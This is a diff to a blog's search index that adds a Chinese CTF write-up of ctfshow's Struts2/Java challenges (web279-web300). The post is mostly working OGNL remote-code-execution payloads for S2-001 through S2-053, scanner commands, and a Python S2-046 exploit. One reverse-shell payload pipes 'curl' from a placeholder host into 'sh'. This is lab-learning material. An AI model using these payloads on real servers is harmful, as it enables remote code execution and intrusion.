@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>Web入门_java</title>
+      <link href="/posts/ctfshow-webbasic-java/"/>
+      <url>/posts/ctfshow-webbasic-java/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>java</h1><hr><blockquote><p>提示: 平台似乎有过滤, 所以提示其实是<code>echo $FLAG</code>, 直接执行这个可能就能输出flag; 但是不是很稳定, 如果不行还是使用<code>env</code></p><p>给出的payload都没有经过编码, 可能需要自己编码</p><p>说是java, 其实是struts2漏洞合集吧, 主要不是做题的, 其实是学代码审计的</p></blockquote><h2 id="web279"><a class="header-anchor" href="#web279">¶</a>web279</h2><ul><li>描述: echo FLAG</li></ul><p>只有跳转链接(戳那个where is flag), 查看源码看到提示(?)S2-001, 这是一个struts2漏洞</p><p><a href="https://www.freebuf.com/column/224041.html">Vulhub漏洞系列：struts2漏洞 S2-001</a>, <a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-001/README.zh-cn.md">vulhub漏洞库_struts2</a></p><p>已经是非常详细了, 漏洞也非常的简单</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br><span class="line"></span><br><span class="line"># 很急, 找了半天找不到flag于是输出环境变量, 有了</span><br><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><h2 id="web280"><a class="header-anchor" href="#web280">¶</a>web280</h2><ul><li>描述: echo FLAG 即可</li></ul><p>查源码, 点击跳转发现提示是S2-005</p><p>参考资料: <a href="https://zhuanlan.zhihu.com/p/701942652">Struts2-005漏洞分析(CVE-2010-1870)</a>, <a href="https://www.freebuf.com/vuls/193078.html">Struts2-005远程代码执行漏洞分析</a></p><blockquote><p>payload不好用</p></blockquote><p>拉倒了, 不如直接去下载一个现成的脚本跑</p><p><a href="https://github.com/Vancomycin-g/Struts2Scan">Struts2Scan</a>, 可以用py也可以直接打开jar文件(那是一个程序)扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 .\Struts2Scan.py -u  https://7bb5c5c0-b262-40d3-8ee0-e1d47d58ed14.challenge.ctf.show/S2-005/example/HelloWorld.action</span><br><span class="line"><span class="comment"># 利用方式如下, 再输入env即可</span></span><br><span class="line">python3 .\Struts2Scan.py -u  https://7bb5c5c0-b262-40d3-8ee0-e1d47d58ed14.challenge.ctf.show/S2-005/example/HelloWorld.action -n S2-005 --<span class="built_in">exec</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240920221137757.png" alt="image-20240920221137757"></p><h2 id="web281"><a class="header-anchor" href="#web281">¶</a>web281</h2><ul><li>描述: echo FLAG</li></ul><p>点击跳转发现url提示是S2-007, 而且能提交的数据不是username和password而是name, age和email; 参数不对肯定扫不出来, 我们设置一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 .\Struts2Scan.py -u https://208910ad-e478-4dd1-a1f8-83459a38ca57.challenge.ctf.show/S2-007/user.action -d name=1&amp;&amp;email=1&amp;&amp;age=1</span><br><span class="line"><span class="comment"># 利用如下, 同样输入env</span></span><br><span class="line">python3 .\Struts2Scan.py -u https://208910ad-e478-4dd1-a1f8-83459a38ca57.challenge.ctf.show/S2-007/user.action -n S2-016 --<span class="built_in">exec</span></span><br></pre></td></tr></table></figure><p>结果扫出来是S2-016, 不是很懂反正能用就行</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921144747121.png" alt="image-20240921144747121"></p><p>然后去找了S2-007的漏洞, <a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-007/README.zh-cn.md">vulhub漏洞库_s2-007</a>, 在age处输入, 回显也在age处</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure><h2 id="web282"><a class="header-anchor" href="#web282">¶</a>web282</h2><ul><li>描述: echo FLAG</li></ul><p>跳转后url提示是S2-008, 可以从<code>./cookie.jsp</code>或者<code>./devmode.jsp</code>入手</p><p>如果要获得flag, 直接用扫描工具访问并扫描这两个网址就可以了, 详细信息请看<a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-008/README.zh-cn.md">vulhub漏洞库_s2-008</a></p><h2 id="web283"><a class="header-anchor" href="#web283">¶</a>web283</h2><ul><li>描述: Struts2 showcase远程代码执行漏洞</li></ul><p><code>CVE-2013-1965</code>?, 你不是<a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-009/README.zh-cn.md">s2-009</a>?</p><p>访问下面的url地址就能读取到env</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-009/ajax/example5?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27env%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span><br></pre></td></tr></table></figure><h2 id="web284"><a class="header-anchor" href="#web284">¶</a>web284</h2><ul><li>描述: 无</li></ul><p>提示为s2-012, 网址我就不放了, 你直接在github打开呗</p><p>payload如下, 直接塞进那个框然后抓包即可</p><blockquote><p>这何尝不是另一种脚本小子</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921153131317.png" alt="image-20240921153131317"></p><h2 id="web285"><a class="header-anchor" href="#web285">¶</a>web285</h2><ul><li>描述: 无</li></ul><p>提示s2-013; Try add some parameters in URL</p><p>s2-013poc如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-013/link.action?a=$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;</span><br></pre></td></tr></table></figure><h2 id="web286"><a class="header-anchor" href="#web286">¶</a>web286</h2><ul><li>描述: 无</li></ul><p>提示: s2-015</p><p>我尝试了可以用的payload, 但是显示env不全, FLAG没出来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-015/$&#123;#context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream()),#q&#125;.action</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921163506207.png" alt="image-20240921163506207"></p><p>还是用工具快:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 .\Struts2Scan.py -u https://660ecde4-19ff-49d8-8a3b-f77b26e45bbd.challenge.ctf.show/S2-015/welcome.action</span><br><span class="line"><span class="comment"># 扫出来三个, 随便用一个得了</span></span><br><span class="line">python3 .\Struts2Scan.py -u https://660ecde4-19ff-49d8-8a3b-f77b26e45bbd.challenge.ctf.show/S2-015/welcome.action -n S2-016 --<span class="built_in">exec</span></span><br></pre></td></tr></table></figure><h2 id="web287"><a class="header-anchor" href="#web287">¶</a>web287</h2><ul><li>描述: 无</li></ul><p>提示: s6-016; Use “action:”, “redirect:”, “redirectAction:” in ./default.action</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-016/default.action?redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(&quot;env&quot;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921164428208.png" alt="image-20240921164428208"></p><h2 id="web288"><a class="header-anchor" href="#web288">¶</a>web288</h2><ul><li>描述: 无</li></ul><p>提示: S2-019</p><p>复现是s2-008, 甚至poc都差不多</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27env%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28new%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A</span><br></pre></td></tr></table></figure><h2 id="web289"><a class="header-anchor" href="#web289">¶</a>web289</h2><ul><li>描述: 无</li></ul><p>提示: S2-029; add “message” param in url</p><p>出问题了, 找了好几个payload用不了, 那就用工具吧</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 .\Struts2Scan.py -u https://3e2cec0b-d431-4809-b4f9-82e49c17f631.challenge.ctf.show/S2-029/</span><br><span class="line"><span class="comment"># 利用</span></span><br><span class="line">python3 .\Struts2Scan.py -u https://3e2cec0b-d431-4809-b4f9-82e49c17f631.challenge.ctf.show/S2-029/ -n S2-045 --<span class="built_in">exec</span></span><br></pre></td></tr></table></figure><h2 id="web290"><a class="header-anchor" href="#web290">¶</a>web290</h2><ul><li>描述: 无</li></ul><p>提示: s2-032</p><p>打开一个界面, 直接套用github上的payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-032/memoshow.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=env </span><br></pre></td></tr></table></figure><h2 id="web291"><a class="header-anchor" href="#web291">¶</a>web291</h2><ul><li>描述: 无</li></ul><p>提示: s2-033, 其实是是<code>s2-045</code>, 或者<code>s2-037</code>, 直接搜索&quot;struts2  /orders/3&quot;就能找到</p><p>给个找到的例子, 进去直接搜索/orders/3: <a href="https://developer.aliyun.com/article/1160444">https://developer.aliyun.com/article/1160444</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-033/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env</span><br></pre></td></tr></table></figure><h2 id="web292"><a class="header-anchor" href="#web292">¶</a>web292</h2><ul><li>描述: 无</li></ul><p><code>S2-037</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://837cc0c1-04ff-4c2f-bbf5-4c4b172436b6.challenge.ctf.show/S2-037/orders/3/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=16456&amp;command=env</span><br></pre></td></tr></table></figure><h2 id="web293"><a class="header-anchor" href="#web293">¶</a>web293</h2><ul><li>描述: 无</li></ul><p><code>S2-045</code>, 看github, 塞在Content-Type发出去</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;env&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure><h2 id="web294"><a class="header-anchor" href="#web294">¶</a>web294</h2><ul><li>描述: 无</li></ul><p><code>S2-046</code>, <a href="https://xz.aliyun.com/t/221?time__1311=eqIx0DyGG%3DemqGKDtD%2FQnx4YuRa%2BzDcDhoD">找到的博客</a></p><p>这次漏洞的触发点在Content-Length和Content-Disposition字段的filename中, 但是你说的对, python真好用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sugarcrm</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">poctest</span>(<span class="params">self</span>):   </span><br><span class="line">        boundary=<span class="string">&quot;---------------------------735323031399963166993862150&quot;</span></span><br><span class="line">        paylaod=<span class="string">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;env&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span></span><br><span class="line">        url = <span class="string">&#x27;http://200258f8-842d-4e4b-a894-ea043fd0d046.challenge.ctf.show/S2-046/doUpload.action&#x27;</span></span><br><span class="line">        headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;multipart/form-data; boundary=&#x27;</span>+boundary+<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">        data =<span class="string">&quot;--&quot;</span>+boundary+<span class="string">&quot;\r\nContent-Disposition: form-data; name=\&quot;foo\&quot;; filename=\&quot;&quot;</span>+paylaod+<span class="string">&quot;\0b\&quot;\r\nContent-Type: text/plain\r\n\r\nx\r\n--&quot;</span>+boundary+<span class="string">&quot;--&quot;</span></span><br><span class="line">        rs=requests.post(url, headers=headers,data=data)</span><br><span class="line">        <span class="built_in">print</span>(rs.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test = Sugarcrm()</span><br><span class="line">    test.poctest()</span><br></pre></td></tr></table></figure><h2 id="web295"><a class="header-anchor" href="#web295">¶</a>web295</h2><ul><li>描述: 无</li></ul><p><code>S2-048</code>, 直接看github有更详细的步骤</p><p>报错界面上那个Message爆出来的number后面就是flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure><h2 id="web296"><a class="header-anchor" href="#web296">¶</a>web296</h2><ul><li>描述: 无</li></ul><p><code>s2-052</code>, 没成功, 用工具跑完了, 指令执行py文件的时候扫不出来, 但是用图形化的又可以</p><p>而且用的还是不是s2-052, 用的s2-045</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 .\Struts2Scan.py -u https://a156802e-1b87-421a-bc6d-afff49ad14f7.challenge.ctf.show/S2-052/ -n S2-045 --exec</span><br></pre></td></tr></table></figure><h2 id="web297"><a class="header-anchor" href="#web297">¶</a>web297</h2><ul><li>描述: 无</li></ul><p><code>s2-053</code>, 详情见github相关界面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;echo $FLAG&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure><p>反弹shell(我没成功, 而且不知道为什么)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;curl https://your-shell.com/ip:port | sh&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure><h2 id="web298"><a class="header-anchor" href="#web298">¶</a>web298</h2><ul><li>描述: 看看代码，了解下和php不一样的地方</li></ul><p><a href="https://github.com/java-decompiler/jd-gui">反编译工具</a>, 直接将war包拖进去就可以用了</p><p>从<code>web.xml</code>可以找到登录判定文件<code>logonServlet.class</code>, 再找到<code>getVipStatus</code>, 里面有账号密码:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">getVipStatus</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.username.equals(<span class="string">&quot;admin&quot;</span>) &amp;&amp; <span class="built_in">this</span>.password.equals(<span class="string">&quot;ctfshow&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到<code>/login</code>了, 可是访问还是404; 结果发现在<code>/ctfshow/login</code></p><p>最终url如下, 登录即可获取flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ctfshow/login?username=admin&amp;password=ctfshow</span><br></pre></td></tr></table></figure><h2 id="web299"><a class="header-anchor" href="#web299">¶</a>web299</h2><ul><li>描述: 了解为主</li></ul><p>打开, 在源码里面发现``/view-source?file=index.php `, 可以读取文件</p><p>先试试读取<code>/view-source?file=/WEB-INF/web.xml</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is the description of my J2EE component This is the display name of my J2EE component ViewSourceServlet com.ctfshow.servlet.ViewSourceServlet This is the description of my J2EE component This is the display name of my J2EE component GetFlag com.ctfshow.servlet.GetFlag ViewSourceServlet /view-source GetFlag /getFlag index.jsp</span><br></pre></td></tr></table></figure><p><code>com/ctfshow/servlet/GetFlag</code>下, 结合常见的文件框架, 那就是<code>/view-source?file=WEB-INF/classes/com/ctfshow/servlet/GetFlag.class</code></p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921212805005.png" alt="image-20240921212805005"></p><p>有个<code>/fl3g</code>, 反正什么都试试</p><h2 id="web300"><a class="header-anchor" href="#web300">¶</a>web300</h2><ul><li>描述: java 告一段落</li></ul><p>你这是真的java还是假的java?</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:52:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件包含?其实就是web299翻版, 直接照着web299走, 换个网址就行了; payload如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=../../../../../f1bg</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctfshow靶场 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞利用 </tag>
+            
+            <tag> RCE </tag>
+            
+            <tag> Java </tag>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Lampiao-1</title>
       <link href="/posts/Lampiao-1/"/>
       <url>/posts/Lampiao-1/</url>
@@ -20,13 +51,13 @@
       
         <tags>
             
-            <tag> msf </tag>
+            <tag> Linux </tag>
             
             <tag> 提权 </tag>
             
             <tag> 爆破 </tag>
             
-            <tag> Linux </tag>
+            <tag> msf </tag>
             
             <tag> 漏洞利用 </tag>
             
@@ -53,9 +84,9 @@
       
         <tags>
             
-            <tag> 提权 </tag>
-            
             <tag> Linux </tag>
+            
+            <tag> 提权 </tag>
             
             <tag> 漏洞利用 </tag>
             
@@ -84,13 +115,13 @@
       
         <tags>
             
-            <tag> msf </tag>
+            <tag> Linux </tag>
             
             <tag> 提权 </tag>
             
             <tag> 爆破 </tag>
             
-            <tag> Linux </tag>
+            <tag> msf </tag>
             
         </tags>
       
@@ -306,9 +337,9 @@
       
         <tags>
             
-            <tag> 绕过 </tag>
-            
             <tag> RCE </tag>
+            
+            <tag> 绕过 </tag>
             
             <tag> SQL </tag>
             
@@ -339,11 +370,11 @@
       
         <tags>
             
-            <tag> PHP </tag>
+            <tag> RCE </tag>
             
             <tag> 绕过 </tag>
             
-            <tag> RCE </tag>
+            <tag> PHP </tag>
             
             <tag> 文件上传 </tag>
             
@@ -370,11 +401,11 @@
       
         <tags>
             
-            <tag> PHP </tag>
+            <tag> RCE </tag>
             
             <tag> 绕过 </tag>
             
-            <tag> RCE </tag>
+            <tag> PHP </tag>
             
             <tag> 文件包含 </tag>
             
@@ -401,11 +432,11 @@
       
         <tags>
             
-            <tag> PHP </tag>
+            <tag> RCE </tag>
             
             <tag> 绕过 </tag>
             
-            <tag> RCE </tag>
+            <tag> PHP </tag>
             
         </tags>
       
@@ -430,11 +461,11 @@
       
         <tags>
             
-            <tag> PHP </tag>
+            <tag> RCE </tag>
             
             <tag> 绕过 </tag>
             
-            <tag> RCE </tag>
+            <tag> PHP </tag>
             
         </tags>
       
@@ -459,11 +490,11 @@
       
         <tags>
             
-            <tag> PHP </tag>
+            <tag> RCE </tag>
             
             <tag> 绕过 </tag>
             
-            <tag> RCE </tag>
+            <tag> PHP </tag>
             
             <tag> 文件包含 </tag>
             
@@ -492,11 +523,11 @@
       
         <tags>
             
-            <tag> PHP </tag>
+            <tag> RCE </tag>
             
             <tag> 绕过 </tag>
             
-            <tag> RCE </tag>
+            <tag> PHP </tag>
             
             <tag> 文件包含 </tag>
             
@@ -523,11 +554,11 @@
       
         <tags>
             
-            <tag> PHP </tag>
+            <tag> RCE </tag>
             
             <tag> 绕过 </tag>
             
-            <tag> RCE </tag>
+            <tag> PHP </tag>
             
